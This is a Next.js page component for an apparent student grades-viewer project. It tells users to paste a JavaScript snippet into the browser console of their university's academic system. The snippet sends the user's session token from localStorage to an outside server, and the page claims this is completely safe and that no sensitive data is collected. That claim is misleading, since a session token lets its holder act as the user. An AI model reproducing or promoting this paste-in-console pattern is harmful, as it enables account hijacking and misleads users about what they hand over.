"use client"

import React from "react"

import { Button } from "@/components/ui/button"
import { GlowBox } from "@/components/ui/glow-box"
import { Icons } from "@/components/ui/icons"
import { Heading, Paragraph } from "@/components/ui/typography"

const Page = () => {
  const [copied, setCopied] = React.useState(false)
  React.useEffect(() => {
    if (copied) {
      navigator.clipboard
        .writeText(`fetch("https://coollege.up.railway.app/api/feed", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: localStorage.session,
})
  .then((r) => r.json())
  .then(console.log)
  .catch(console.warn)
            `)

      setTimeout(() => {
        setCopied(false)
      }, 3000)
    }
  }, [copied])

  return (
    <>
      <div className="container">
        <Heading className="text-center">
          Tu historial académico{" "}
          <span className="bg-gradient-to-r from-purple-500 to-red-600 bg-clip-text text-transparent">
            como siempre lo deseaste
          </span>
        </Heading>
      </div>

      <div className="container mb-24 mt-8 flex flex-col items-center px-8">
        <GlowBox
          colors="from-red-600 to-purple-500"
          className="max-w-sm md:max-w-full"
        >
          <pre className="javascript relative text-left font-mono text-xs font-bold tracking-wide text-slate-300 md:text-base">
            <code className="block p-4">
              {`fetch("https://coollege.up.railway.app/api/feed", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: localStorage.session,
})
  .then((r) => r.json())
  .then(console.log)
  .catch(console.warn)
    `}
            </code>
            <div
              className="absolute bottom-2 right-2 rounded border border-transparent p-2 text-slate-700 hover:border-slate-500 hover:text-slate-500 "
              onClick={() => setCopied(true)}
            >
              {copied ? (
                <Icons.clipboardCheck className="h-4 w-4" />
              ) : (
                <Icons.clipboard className="h-4 w-4" />
              )}
            </div>
          </pre>
        </GlowBox>

        <div className="flex flex-col justify-center space-y-2">
          <Button variant="link">
            <a
              href="https://sistema-academico.utec.edu.pe/dashboard"
              target="_blank"
              rel="noreferrer"
              className="mt-2 flex items-center justify-center space-x-2 text-slate-700"
            >
              <Icons.externalLink className="h-4 w-4" />
              <span>
                Ejecuta el programa en la{" "}
                <span className="underline">consola</span> del Sistema Académico
                (F12)
              </span>
            </a>
          </Button>

          <Button variant="link">
            <a
              href="https://github.com/cuevantn/beauty-grades"
              target="_blank"
              rel="noreferrer"
              className="mt-2 flex items-center justify-center space-x-2 text-slate-700"
            >
              <Icons.github className="h-4 w-4" />
              <span>Ver el código fuente</span>
            </a>
          </Button>
        </div>
      </div>

      <div className="container">
        <Heading as="h3">¿Cómo funciona?</Heading>
        <Paragraph>
          Guardamos los datos de tu historial académico en Xata, una base de
          datos 33 veces más rápida que la de tu universidad.
        </Paragraph>
        <Paragraph>
          Utilizamos Next.js, un framework para aplicaciones web súper potente.
        </Paragraph>

        <Heading as="h3">¿Es seguro?</Heading>
        <Paragraph>
          Completamente. No guardamos ningún dato sensible, como tu contraseña o
          tus datos personales.
        </Paragraph>
        <Paragraph>
          El código fuente está disponible en GitHub, y puedes revisarlo para
          saber qué es lo que hacemos con tus datos.
        </Paragraph>
      </div>
    </>
  )
}

export default Page
